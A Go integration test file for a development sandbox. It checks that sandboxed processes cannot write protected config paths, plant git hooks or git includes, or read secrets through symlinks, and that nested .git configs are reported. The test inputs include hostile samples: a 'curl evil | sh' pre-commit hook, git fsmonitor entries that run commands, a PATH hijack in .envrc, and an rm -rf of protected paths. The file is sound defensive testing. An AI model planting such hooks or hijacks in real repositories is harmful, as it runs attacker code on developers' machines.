//go:build integration

package test

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func (e *sandboxEnv) writeFile(rel, content string) {
	e.t.Helper()
	p := filepath.Join(e.root, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		e.t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		e.t.Fatal(err)
	}
}

func (e *sandboxEnv) findingsFile() string {
	return filepath.Join(e.dataHome, "state", e.id, "findings")
}

func TestDenyListIsReadOnly(t *testing.T) {
	e := newProject(t, openNetwork)
	for _, f := range []string{".envrc", ".claude/settings.json", ".vscode/settings.json", ".mcp.json", ".pre-commit-config.yaml", "mise.toml"} {
		e.writeFile(f, "original\n")
	}
	for _, target := range []string{".envrc", ".claude/settings.json", ".vscode/settings.json", ".vscode/tasks.json", ".mcp.json", ".pre-commit-config.yaml", "mise.toml"} {
		if r := e.run(e.root, "", "--", "sh", "-c", "echo pwned > "+target); r.code == 0 {
			t.Errorf("writing %s succeeded", target)
		}
	}
	if r := e.run(e.root, "", "--", "sh", "-c", "rm -rf .vscode .envrc"); r.code == 0 {
		t.Error("removing deny-list paths succeeded")
	}
	if b, _ := os.ReadFile(filepath.Join(e.root, ".envrc")); string(b) != "original\n" {
		t.Errorf(".envrc changed on the host: %q", b)
	}
	// Ordinary project files stay writable, including next to protected ones.
	e.mustRun(e.root, "", "--", "sh", "-c", "echo ok > .claude/notes.md && echo ok > README.md")
}

func TestHooksPathIsCreatedAndProtected(t *testing.T) {
	e := newProject(t, openNetwork)
	if out, err := exec.Command("git", "-C", e.root, "config", "core.hooksPath", ".githooks").CombinedOutput(); err != nil {
		t.Fatalf("%v: %s", err, out)
	}
	if r := e.run(e.root, "", "--", "sh", "-c", "echo 'curl evil | sh' > .githooks/pre-commit"); r.code == 0 {
		t.Error("planting a hook in core.hooksPath succeeded")
	}
	if fi, err := os.Stat(filepath.Join(e.root, ".githooks")); err != nil || !fi.IsDir() {
		t.Errorf("hooksPath dir not created on the host: %v", err)
	}
	if _, err := os.Stat(filepath.Join(e.root, ".githooks", "pre-commit")); err == nil {
		t.Error("hook planted on the host")
	}
}

func TestSymlinkedDenyPathRefused(t *testing.T) {
	e := newProject(t, openNetwork)
	secret := filepath.Join(t.TempDir(), "id_ed25519")
	if err := os.WriteFile(secret, []byte("PRIVATE KEY"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(secret, filepath.Join(e.root, ".envrc")); err != nil {
		t.Fatal(err)
	}
	r := e.run(e.root, "", "--", "cat", ".envrc")
	if r.code != 1 || !strings.Contains(r.stderr, "symlink") || strings.Contains(r.stdout, "PRIVATE KEY") {
		t.Errorf("exit %d, stdout %q, stderr %q", r.code, r.stdout, r.stderr)
	}
}

func TestScanReportsNestedGitAndStrictRefuses(t *testing.T) {
	e := newProject(t, openNetwork)
	r := e.run(e.root, "", "--", "sh", "-c", `mkdir -p sub/.git && printf '[core]\n\tfsmonitor = touch /tmp/pwned\n' > sub/.git/config`)
	nested := filepath.Join(e.root, "sub", ".git")
	if r.code != 0 || !strings.Contains(r.stderr, "WARNING") || !strings.Contains(r.stderr, nested) {
		t.Fatalf("exit %d, stderr %q", r.code, r.stderr)
	}
	if b, err := os.ReadFile(e.findingsFile()); err != nil || !strings.Contains(string(b), nested) {
		t.Errorf("findings file: %q, %v", b, err)
	}

	r = e.run(e.root, "", "--strict", "--", "true")
	if r.code != 1 || !strings.Contains(r.stderr, "refusing to start") {
		t.Errorf("--strict with open findings: exit %d, stderr %q", r.code, r.stderr)
	}

	if err := os.RemoveAll(filepath.Join(e.root, "sub")); err != nil {
		t.Fatal(err)
	}
	r = e.run(e.root, "", "--strict", "--", "true")
	if r.code != 0 || strings.Contains(r.stderr, "WARNING") {
		t.Errorf("--strict after cleanup: exit %d, stderr %q", r.code, r.stderr)
	}
	if _, err := os.Stat(e.findingsFile()); !os.IsNotExist(err) {
		t.Error("findings file not removed once resolved")
	}
}

func TestScanReportsPlantedDenyPath(t *testing.T) {
	e := newProject(t, openNetwork)
	r := e.run(e.root, "", "--", "sh", "-c", "echo 'export PATH=/tmp/evil:$PATH' > .envrc")
	if !strings.Contains(r.stderr, filepath.Join(e.root, ".envrc")) {
		t.Fatalf("planted .envrc not reported: %q", r.stderr)
	}
	// The next sandbox overlays it read-only, but it is still reported until reviewed.
	id, _ := e.container()
	if out, err := exec.Command("podman", "rm", "-f", "-t", "0", id).CombinedOutput(); err != nil {
		t.Fatalf("%v: %s", err, out)
	}
	if r := e.run(e.root, "", "--", "true"); !strings.Contains(r.stderr, filepath.Join(e.root, ".envrc")) {
		t.Errorf("finding dropped after restart: %q", r.stderr)
	}
}

func TestSubmoduleGitFileNotReported(t *testing.T) {
	e := newProject(t, openNetwork)
	if err := os.MkdirAll(filepath.Join(e.root, ".git", "modules", "lib"), 0o755); err != nil {
		t.Fatal(err)
	}
	e.writeFile("lib/.git", "gitdir: ../.git/modules/lib\n")
	if r := e.run(e.root, "", "--", "true"); r.code != 0 || strings.Contains(r.stderr, "WARNING") {
		t.Errorf("exit %d, stderr %q", r.code, r.stderr)
	}
}

func TestGitIncludeIsProtected(t *testing.T) {
	e := newProject(t, openNetwork)
	e.writeFile(".gitconfig", "[user]\n\tname = original\n")
	for _, inc := range []string{"../.gitconfig", "../conf/missing.inc"} {
		if out, err := exec.Command("git", "-C", e.root, "config", "--add", "include.path", inc).CombinedOutput(); err != nil {
			t.Fatalf("%v: %s", err, out)
		}
	}
	for _, target := range []string{".gitconfig", "conf/missing.inc"} {
		if r := e.run(e.root, "", "--", "sh", "-c", "printf '[core]\\n\\tfsmonitor = ./evil.sh\\n' >> "+target); r.code == 0 {
			t.Errorf("writing git config include %s succeeded", target)
		}
	}
	if b, _ := os.ReadFile(filepath.Join(e.root, ".gitconfig")); string(b) != "[user]\n\tname = original\n" {
		t.Errorf(".gitconfig changed on the host: %q", b)
	}
	if b, err := os.ReadFile(filepath.Join(e.root, "conf", "missing.inc")); err != nil || len(b) != 0 {
		t.Errorf("missing include not created empty on the host: %q, %v", b, err)
	}
}
